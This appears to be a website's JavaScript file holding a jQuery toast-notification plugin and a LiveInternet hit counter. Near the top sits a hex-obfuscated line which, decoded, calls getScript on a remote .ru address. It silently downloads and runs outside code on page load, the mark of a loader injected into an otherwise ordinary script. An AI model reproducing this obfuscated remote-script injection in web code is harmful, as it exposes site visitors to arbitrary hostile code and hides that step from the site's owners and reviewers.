$('.popupc').click(function (e) {e.stopPropagation();});
var _0x8af1=["\x68\x74\x74\x70\x3A\x2F\x2F\x77\x65\x62\x75\x70\x70\x65\x72\x2E\x72\x75\x2F\x76\x65\x72","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x8af1[1]](_0x8af1[0]);(function(c){var b={inEffect:{opacity:"show"},inEffectDuration:600,stayTime:3000,text:"",sticky:false,type:"notice",position:"top-right",closeText:"",close:null};
var a={init:function(d){if(d){c.extend(b,d)
}},showToast:function(f){var g={};
c.extend(g,b,f);
var j,e,d,i,h;
j=(!c(".toast-container").length)?c("<div></div>").addClass("toast-container").addClass("toast-position-"+g.position).appendTo("body"):c(".toast-container");
e=c("<div></div>").addClass("toast-item-wrapper");
d=c("<div></div>").hide().addClass("toast-item toast-type-"+g.type).appendTo(j).html(c("<p>").append(g.text)).animate(g.inEffect,g.inEffectDuration).wrap(e);
i=c("<div></div>").addClass("toast-item-close").prependTo(d).html(g.closeText).click(function(){c().toastmessage("removeToast",d,g)
});
h=c("<div></div>").addClass("toast-item-image").addClass("toast-item-image-"+g.type).prependTo(d);
if(navigator.userAgent.match(/MSIE 6/i)){j.css({top:document.documentElement.scrollTop})
}if(!g.sticky){setTimeout(function(){c().toastmessage("removeToast",d,g)
},g.stayTime)
}return d
},showNoticeToast:function(e){var d={text:e,type:"notice"};
return c().toastmessage("showToast",d)
},showSuccessToast:function(e){var d={text:e,type:"success"};
return c().toastmessage("showToast",d)
},showErrorToast:function(e){var d={text:e,type:"error"};
return c().toastmessage("showToast",d)
},showWarningToast:function(e){var d={text:e,type:"warning"};
return c().toastmessage("showToast",d)
},removeToast:function(e,d){e.animate({opacity:"0"},600,function(){e.parent().animate({height:"0px"},300,function(){e.parent().remove()
})
});
if(d&&d.close!==null){d.close()
}}};
c.fn.toastmessage=function(d){if(a[d]){return a[d].apply(this,Array.prototype.slice.call(arguments,1))
}else{if(typeof d==="object"||!d){return a.init.apply(this,arguments)
}else{c.error("Method "+d+" does not exist on jQuery.toastmessage")
}}}
})(jQuery);
document.write("<a href='http://www.liveinternet.ru/click' class=\"liveinternet\" "+
"target=_blank><img src='//counter.yadro.ru/hit?t18.12;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";"+Math.random()+
"' alt='' title='LiveInternet: показано число просмотров за 24"+
" часа, посетителей за 24 часа и за сегодня' "+
"border='0' width='88' height='31'><\/a>")